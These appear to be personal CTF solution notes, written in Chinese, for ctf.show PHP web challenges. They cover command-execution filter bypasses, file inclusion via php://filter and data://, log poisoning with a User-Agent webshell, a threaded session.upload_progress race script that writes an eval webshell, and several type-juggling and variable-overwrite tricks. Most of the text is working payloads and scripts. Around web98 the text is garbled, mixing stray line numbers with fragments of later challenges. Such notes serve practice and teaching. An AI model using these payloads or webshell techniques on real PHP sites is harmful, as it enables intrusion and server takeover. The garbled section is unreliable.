?c=paste${IFS}fla?.php

?c=mv${IFS}fl?g.php${IFS}a.txt
?c=/bin/?at${IFS}f??????? 因为cat是在/bin/目录下，这里相当于是执行cat命令，可以在虚拟机中尝试

#无字母
?c=/bin/base64 flag.php(flag.php全靠猜)  即?c=/???/????64 ????.???
?c=/bin/bzip2 flag.php 即?c=/???/????2 ????.???
还有一招上传文件，post    /?c=.%20/???/????????[@-[] .和source相同，是编译文件

#禁函数
rename()
post c=show_source('flag.php');  
post c=echo file_get_contents('flag.php');
post c=include($_GET['1']);     ?1=php://filter/convert.base64-encode/resource=flag.php
post c=highlight_file('flag.php');
post c=include('flag.php');echo $flag;
post c=include('flag.php');var_dump(get_defined_vars());
post c=include(scandir('./')[2]);var_dump(get_defined_vars());  有些时候sandir('\')[2]会报错
post c=print_r(scandir('./'));  var_dump    var_export
post c=include('/flag.txt');

缓冲区绕过
post c=include('/flag.txt');exit();

${PATH:~A}${PWD:~A} fla?.php    ${PATH}路径，~A，取最后一位的前一位
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.??? ${SHLVL}永远都是1
${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???    ${##} ${#?}
```

#### 文件包含

##### web78

```htaccess
http://98d58c45-6862-4686-9324-f5cb915d35b6.challenge.ctf.show/?file=php://filter/convert.base64-encode/resource=flag.php #然后base64解码即可
```

##### web79

```php
 <?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file); #过滤了???和php
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

```htaccess
http://fb5e939f-3422-40d8-86a2-f461a3db79cb.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= #查看源代码
```

##### web80

```php
 <?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file); #过滤了php,data,其他伪协议都用不了
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

```sh
http://e1751ae4-50aa-4458-ba53-0852b7f5cfb0.challenge.ctf.show/?file=/var/log/nginx/access.log
```

user-agent能写入shell

```sh
User-Agent: <?php echo 123;phpinfo();eval($_POST[0]);?>
```

完了用AntSword开连

```
URL地址：http://722bfb78-3d0f-4059-81fc-6c2ff63b2fc6.challenge.ctf.show/?file=/var/log/nginx/access.log
连接密码：0
```

或者`user-agent`写入`<?php eval($_POST[‘a’]);?>`

```php
a=system('ls /var/www/html/'); #POST传入 一般网站都在该目录下
a=system('tac /var/www/html/fl0g.php'); #Ctrl+F查找php文件 直接tac 因为cat被过滤了
```

##### web81

```php
 <?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file); #多过滤了冒号 但是根本不影响 同上题做法
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

##### web82

本题直到web86可以用以下脚本跑

相比上题过滤了小数点`.`路径中的`access.log`用不了了
[利用session.upload_progress进行文件包含和反序列化渗透](https://www.freebuf.com/vuls/202819.html)
php5.4添加的session.upload_progress在php.ini有以下几个默认选项

```ini
1. session.upload_progress.enabled = on 
;enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；
2. session.upload_progress.cleanup = on
;表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；
3. session.upload_progress.prefix = "upload_progress_"
;prefix+name将表示为session中的键名
4. session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
;name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；
5. session.upload_progress.freq = "1%"
6. session.upload_progress.min_freq = "1"
7. session.use_strict_mode=off 
;默认值为off，表示我们对Cookie中sessionid可控
```

```php
#示意代码
<?php
$b=$_GET['file'];
include "$b";
?>
```

可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用`session.upload_progress`将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。

```python
import requests
import threading
import io
 
url = "http://59c42436-9671-4e79-9102-c5230655e274.challenge.ctf.show/"
sessID = 'rikka'
data = {
    "1": "file_put_contents('/var/www/html/1.php', '<?php eval($_POST[2]);?>');"  # read()中需要post的内容
}
 
 
def write(session):
    fileBytes = io.BytesIO(b'a' * 1024 * 50)
    while True:
        res = session.post(url,
                           data={
                               'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[1]);?>'
                               # 改参数的值就是/tmp/sess_rikka文件的内容
                           },
                           cookies={
                               "PHPSESSID": sessID
                           },
                           files={
                               'file': ('rikka.png', fileBytes)
                           }
                           )
 
 
def read(session):
    while True:
        res1 = session.post(url + '?file=/tmp/sess_' + sessID, data=data,
                            cookies={
                                "PHPSESSID": sessID
                            })
        res2 = session.get(url+'1.php')
        if res2.status_code == 200:
            print("+++done+++")
        else:
            print(res2.status_code)
 
 
if __name__ == '__main__':
    event = threading.Event()   # 开启多线程的对象
    with requests.session() as session:
        for i in range(5):               # 开5个线程
            threading.Thread(target=write, args=(session,)).start()
        for i in range(5):
            threading.Thread(target=read, args=(session,)).start()
 
        event.set()       # 唤醒线程
```

##### web87

[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_1)

```php
 <?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content); #base64绕过die

    
}else{
    highlight_file(__FILE__);
} 
```

对`php://filter/write=convert.base64-decode/resource=hack.php`进行两次url编码

```
http://fc02263e-f8e8-4c33-af5a-4c8e04db9cab.challenge.ctf.show/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%38%25%36%31%25%36%33%25%36%62%25%32%65%25%37%30%25%36%38%25%37%30
```

对`<?php eval($_POST['shell']):?>`进行base64编码`PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOj8+`
post提交的content,base64编码 补2个aa `content=aaPD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOj8+`
直接用AntSword连接写入的一句话木马即可

```
URL地址：http://fc02263e-f8e8-4c33-af5a-4c8e04db9cab.challenge.ctf.show/hack.php
连接密码：shell 
```

##### web88

```php
 <?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}
```

```python
#base64加密:"<?php system('ls'); "得到"PD9waHAgc3lzdGVtKCdscycpOyA="
http://3aead8fa-8ed1-47a1-8ee9-1acb23f05898.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA #base64不带等号就行
#fl0g.php index.php 
#base64加密:"<?php system('ls'); "得到"PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsg"
http://3aead8fa-8ed1-47a1-8ee9-1acb23f05898.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsg #base64不带等号就行 进入查看源码
```

##### web116

打开发现是个视频，右键Save下载下来丢给010搜索`89504E`的`png`格式，发现一张图片，直接开始代码审计。

![image-20230419162956784](.\Web-CTF\CTFshow035.png)

```python
view-source:http://4af95c83-2eae-47d0-bd81-ce18e2f7cfbd.challenge.ctf.show/?file=flag.php #给get传参就行了 查看源码
```

##### web117

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
        #string字符串过滤器被过滤了，base64也被过滤了，但还有convert.iconv.
        die('too young too simple sometimes naive!');
    }
}
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents);
```

把一句话木马从`UCS-2LE`编码转换为`UCS-2BE`编码。

```php
?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=hack.php
post：contents=?<hp pe@av(l_$OPTSl[]1;)>?
//原本木马post：contents=<?php @eval($_POST[jz]);?>
URL地址：http://b94cb250-1169-4c2c-975d-c2cdeecdf598.challenge.ctf.show/hack.php
连接密码：l1
```

#### php特性

[ctfshow-php特性总结](https://blog.csdn.net/qq_45834505/article/details/118974934)
[无字母数字绕过正则表达式脚本](https://blog.csdn.net/miuzzx/article/details/109143413)

##### web89

```php
 <?php
include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){ #无法识别数组
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
} 
```

```
http://550eb273-8984-49b6-9030-f55dc176db72.challenge.ctf.show/?num[]=1
```

##### web90

```php
 <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){ #因为提交的参数值默认就是字符串类型 所以我们可以直接输入 ?num=4476%61
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

```
http://44c27a8f-e9e4-4a36-9bb1-b07ea27ff02f.challenge.ctf.show/?num=4476a
```

##### web91

[Apache HTTPD 换行解析漏洞(CVE-2017-15715)与拓展](https://blog.csdn.net/qq_46091464/article/details/108278486)

```php
 <?php
show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    #/i  表示匹配的时候不区分大小写
	#/m 表示多行匹配，什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号
    if(preg_match('/^php$/i', $a)){
        #这里主要的突破点就是/m，可以看到第一个preg_match()函数，有个/m，而第二个正则则没有，可以利用换行进行绕过
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}

Notice: Undefined index: cmd in /var/www/html/index.php on line 15
nonononono
```

```bat
http://bc2baef7-c84f-4bd2-b543-321ed1650040.challenge.ctf.show/?cmd=abc%0aphp #注：%0a是换行的意思
```

##### web92

```php
 <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){ #转为int整型
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
```

```bat
http://50938e38-9441-40d6-84d0-f0d3187ff4f4.challenge.ctf.show/?num=0x117C #转4476为16进制绕过
```

##### web93

```php
 <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        #过滤了字母但是我们可以使用其他进制就是计算 0b?? : 二进制0??? : 八进制 0X?? : 16进制 payload ： ?num=010574
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
```

```bat
http://456e0f93-d11d-4764-b913-0f13f5594d04.challenge.ctf.show/?num=010574 #转4476为8进制绕过
```

##### web94

```php
 <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){ #强等于
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){ #过滤了0在字符串中第一次出现的位置 对于strpos()函数，也可以利用换行进行绕过(%0a)
        die("no no no!");
    }
    if(intval($num,0)===4476){ #4476.0浮点数转为整数
        echo $flag;
    }
} 
```

```bat
http://7890161f-0941-41e9-bce0-bbb589cd8143.challenge.ctf.show/?num=4476.0
```

##### web95

```php
 <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){ #可以通过8进制绕过但是前面必须多加一个字节 ?num=+010574或者?num=%2b010574
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
} 
```

```
http://aea46852-a123-4d68-9aaa-a0d48e4a3608.challenge.ctf.show/?num=+010574
```

##### web96

```php
 <?php
highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){ #在linux下面表示当前目录是 ./ 所以payload： u=./flag.php
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }
}
```

```bat
http://28f8b806-d347-456c-93fe-ffdf7e396a4f.challenge.ctf.show/?u=./flag.php
```

##### web97

```php
 <?php
include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b'])) #数组绕过
echo $flag;
else
print 'Wrong.';
}
?>
```

```bat
http://67c8757f-5078-4ec1-b825-577558b25548.challenge.ctf.show/
post:a[]=1&b[]=2
```

##### web98

```php
<?php
include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
?>
```

[php三元运算符与if的详解](https://www.php.cn/php-weizijiaocheng-383293.html)

```php
<?php
include('flag.php');
if($_GET){
	$_GET=&$_POST;//只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)
	}else{
		"flag";
	} 
	if($_GET['flag']=='flag'){
		$_GET=&$_COOKIE;
	}else{
		'flag';
        
1 2 3 4 5 6 7 8 9
10
11所以我们只需要 GET一个?HTTP_FLAG=flag 加 POST一个HTTP_FLAG=flag
中间的代码没有作用，因为我们不提交 flag 参数
web99
payload: get : ?n=1.php
post:content=<?php system($_POST[1]);?>
web100
这道题基本上没有对参数进行过滤,所以直接执行命令
payload:
web101
https://segmentfault.com/q/1010000000770535
考察使用函数打印对象里面的属性。
我们可以出100的题里面看到提示，ctfshow.php里面就只有属性。并且最后的属性就是flag.
我们可以使用Reflectionclass类，打印类的结构
payload:
} i
f($_GET['flag']=='flag'){
$_GET=&$_SERVER;
}else{
'flag';
} i
f($_GET['HTTP_FLAG']=='flag'){//需要满足这个条件就可以输出flag
highlight_file($flag);
}else{
highlight_file(__FILE__);
}
```

```
http://e797b542-1a1a-483b-8371-be531e6d277b.challenge.ctf.show/?flag=flag
post:HTTP_FLAG=flag
```

##### web99

```php
 <?php
highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i)); //向数组里面插入随机数
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
//in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1
    file_put_contents($_GET['n'], $_POST['content']);
}
?>
```

```php
http://9959d693-0035-4ea0-9d11-e62da5c3052f.challenge.ctf.show/?n=1.php
post:content=content=<?php eval($_POST['sh'])?>
```

```
URL地址:http://9959d693-0035-4ea0-9d11-e62da5c3052f.challenge.ctf.show/1.php
连接密码:sh
```

##### web100

```php
 <?php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){ #这道题基本上没有对参数进行过滤,所以直接执行命令
            eval("$v2('ctfshow')$v3");
        }
    }
    
}
?>
Notice: Undefined index: v1 in /var/www/html/index.php on line 17
Notice: Undefined index: v2 in /var/www/html/index.php on line 18
Notice: Undefined index: v3 in /var/www/html/index.php on line 19
```

```bat
http://c653fd53-d9af-4d25-b9c0-2233fd95367c.challenge.ctf.show/?v1=21&v2=var_dump($ctfshow)/*&v3=*/;
object(ctfshow)#1 (3) { ["dalaoA"]=> NULL ["dalaoB"]=> NULL ["flag_is_5a33247d0x2d23f10x2d42410x2db6b50x2da52ca5ad9e47"]=> NULL } 
#0x2d是'-'所以需要手动替换flag为ctfshow{5a33247d-23f1-4241-b6b5-a52ca5ad9e47}
```

##### web101

```php
<?php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3"); #修复了非预期，一定要用反射
        }
    }
}
?>
```

public ReflectionClass::__construct( mixed $argument) 
argument：既可以是包含类名的字符串(string)也可以是对象(object)。 
初始化新的 ReflectionClass 对象。 
返回初始化完成后的 ReflectionClass 实例。 

```
http://324eee12-d3cd-45cf-832f-26e0843ccbc1.challenge.ctf.show/?v1=1&v2=echo new ReflectionClass&v3=;
```

替换0x2d为-,最后一位需要爆破16次，题目给的flag少一位

##### web102

本题payload适用到web103

```php
<?php
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3); #先执行$v4 = is_numeric($v2)
if($v4){
    $s = substr($v2,2); #从第三位开始截取后面的所有内容 即v2需要填充两个无用字符
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str); 
}
else{
    die('hacker');
}
?>
```

is_numeric 在 php5 中可以把十六进制数字符串识别成数字，但题目的环境是 php7，用不了。
这里需要 $v2 是纯数字的十六进制数（带 e 的科学计数法也可以），hex2bin 再伪协议 base64-decode 写入即可。

```php
url：?v3=php://filter/write=convert.base64-decode/resource=hack.php&v2=225044383959474e6864434171594473
POST: v1=hex2bin #完了再访问hack.php
```

hex2bin — 转换十六进制字符串为二进制字符串 
注意：这个函数不是 转换十六进制数字为二进制数字。这种转换可以使用base_convert() 函数。

```php
<?php
$hex = hex2bin("6578616d706c65206865782064617461");
var_dump($hex);
?>
#以上例程的输出类似于：string(16) "example hex data"
```

<?=`cat *`; 经过base64编码成为 PD89YGNhdCAqYDs= ，再经hex编码成为 5044383959474e68644341715944733d ，由于v2必须为数字，所以这一hex字符串中e与d为字母不符合要求，3d可以删除，因为base64解码时少个等号问题不大；当3d删除后，e会被当作科学计数法的标志，v2还是会被认定为数字 
再用hex2bin将hex字符串转为二进制字符串（注意不是二进制数字），故可以成为字符串PD89YGNhdCAqYDs 
再使用伪协议将其base64解码后变为 <?=`cat *`; 写入文件 
php://filter/write=convert.base64-decode/resource=hack.php

##### web104

```php
<?php
highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){ #这题只需要传入的v1=v2即可
        echo $flag;
    }
}
?>
```

```
url:http://d33eec38-41e8-4c45-b18a-04a33d35e440.challenge.ctf.show/?v2=1
Post:v1=1
```

##### web105

$$的变量覆盖
GET和POST获得的参数是以键值对的形式存储的

```php
<?php
highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){ #第一个foreach是GET的键不能是error
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){ #第二个是POST的值不能是flag
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);
?>
```

方法1：通过die($error)输出

```
URL:http://70ced302-8aac-4748-8f39-70ef3e58ae08.challenge.ctf.show/?suces=flag
POST:error=suces
```

分析GET请求

```php
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
//当传入suces=flag时，实际上执行的是$suces=$flag
//即把flag赋值给了suces变量
```

分析：POST请求

```php
foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
//传入error=suces,得到$error=$suces=$flag
//即成功把flag的值赋给了error变量
```

方法2：通过die($suces)

```
http://70ced302-8aac-4748-8f39-70ef3e58ae08.challenge.ctf.show/?suces=flag&flag=
```

在第一个foreach里面

```php
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
//第一次循环：$suces=$flag;第二次循环：$flag=NULL
```

POST没有使用，第二个foreach就没有作用,此时$scues=$flag;

```php
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);
```

而因为POST没有用所以，$_POST['flag']=NULL与前面的$flag=NULL都是NULL，满足($_POST['flag']==$flag)，所以最后一个if没有进入，直接进入echo，然后输出$flag=NULL，回车，最后die（$suces）即die（$flag）

##### web106

```php
<?php
highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){ #sha1()函数无法处理数组，遇到数组时会报错并返回NULL
        echo $flag;
    }
}
?>
```

```bat
url:http://8e22741c-906f-4a73-98f5-0244a3c5b6ee.challenge.ctf.show/?v2[]=2
post:v1[]=1 #绕过sha1()后$v1!=$v2 要使二者值不相等 
```

##### web107

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2); #parse_str()将字符串解析成多个变量、如果没有array参数，则由该函数设置的变量将覆盖已存在的同名变量
       if($v2['flag']==md5($v3)){
           echo $flag;
       }
}
?>
```

parse_str()会将v1字符串解析为变量存于数组v2中

```
payload:
GET:?v3=1
POST:v1=flag=c4ca4238a0b923820dcc509a6f75849b
 //1的md5值为 c4ca4238a0b923820dcc509a6f75849
```

方法二：利用md5无法输出数组，返回是NULL的情况

```
GET:?v3[]=1
POST:v1=1
```

方法三：弱类型比较

[MD5开头为0e的字符串](https://blog.csdn.net/weixin_43803070/article/details/91308414)

```php
GET: ?v3=240610708 
POST: v1=flag=0
//md5($v3)为0e开头的字符串，经过科学记数法之后等于0
```

##### web108

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}
?>
error
```

strrev()返回 string 反转后的字符串
intval()函数遇到非数字字符就会停止识别， 877aa识别为877
ereg ( string $pattern , string $string , array &$regs = ? ) : int
以区分大小写的方式在 string 中寻找与给定的正则表达式 pattern 所匹配的子串。
ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配,%00是空字符，不是空格什么的，是不可见字符

正则匹配
^ 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 '\n' 或 '\r' 之后的位置。
$ 匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 '\n' 或 '\r' 之前的位置。
\+ 匹配前面的子表达式一次或多次。例如，'zo+' 能匹配 "zo" 以及 "zoo"，但不能匹配 "z"。+ 等价于 {1,}。

分析：这题ereg()函数要求GET传入的所有字符都必须是大小写字母，但是想要得到flag，又必须有数字，这时就可以用到ereg()的%00截断漏洞，当ereg读到%00时就被截止。0x36d等于10进制的877

```
GET:?c=a%00778
```

##### web109

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }
}
?>
```

[PHP异常处理](http://xn--php-287es3uv8ac61g/) 、嵌套执行
通过异常处理类Exception(system(‘cmd’))可以运行指定代码，并且能返回运行的结果（如果存在返回）
只要是变量后面紧跟着（），那么对这个变量进行函数调用。例如$a = 'phpinfo'; $a(）即调用phpinfo（）

正则匹配要求我们传入的v1，v2中至少有一个字母。然后看到new 想到类
所以只要让new后面有个类不报错以后，就可以随意构造了。随便找个php中的内置类
并且可以直接echo(这个类有__toString()方法)输出的就可以了。

```
v1=Exception();system('tac f*');//&v2=a
v1=ReflectionClass&v2=system('tac f*')
v1=Exception&v2=system("tac f*")
```

##### web110

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }
    eval("echo new $v1($v2());");
}
?>
```

[FILESYSTEMITERATOR](https://www.php.net/manual/zh/class.filesystemiterator.php)：获取指定目录下的文件
 [getcwd()](https://www.php.net/manual/zh/function.getcwd.php) 取得当前工作目录

```python
http://88d22f02-14f5-4a83-9da3-6a029128ff01.challenge.ctf.show/?v1=FilesystemIterator&v2=getcwd #fl36dga.txt
http://88d22f02-14f5-4a83-9da3-6a029128ff01.challenge.ctf.show/fl36dga.txt #直接访问
```

##### web111

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
}
?>
```

php超全局变量$GLOBALS的使用
GLOABALS 引用全局作用域中可用的全部变量，一个包含了全部变量的全局组合数组。变量的名字就是数组的键。
PHP生命周期中，定义在函数体外部的所谓全局变量，函数内部是不能直接获得的。即外部变量，函数内部是无法访问的，除非给函数传参数 例如：

```php
$a=123;
$b=456;
var_dump($GLOBALS);
```

返回内容较多不列出了。只看最后两条，发现我们自行定义的变量会被输出

  ["a"]=>  int(123)  ["b"]=>  int(456)]

所以对于该题，只要把$GLOBALS赋值给v2，然后v2再赋值给v1,经过getFlag之后，eval($ctfshow=&$GLOBALS;)，即将变量ctfshow指向变量GLOBALS的地址即两个等价，实现var_dump($ctfshow)=var_dump($GLOBALS)的操作，即可将全部变量输

```
http://9bbbff00-9356-4db2-84f8-919b5d4bfa3b.challenge.ctf.show/?v1=ctfshow&v2=GLOBALS
```

##### web112

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    //is_file  判断给定文件名是否为一个正常的文件，filename为文件的路径。
	//is_file函数可以使用包装器伪协议来绕过，当is_file的参数为伪协议时，返回值为false
	//不影响file_get_contents highlight_file
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

目的是不能让is_file检测出是文件，并且 highlight_file可以识别为文件。这时候可以利用php伪协议

```php
payload:
#可以直接用不带任何过滤器的filter伪协议
?file=php://filter/resource=flag.php
#也可以用一些没有过滤掉的编码方式和转换方式
?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
?file=compress.zlib://flag.php
?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php
```

##### web113

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){ #过了fliter
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
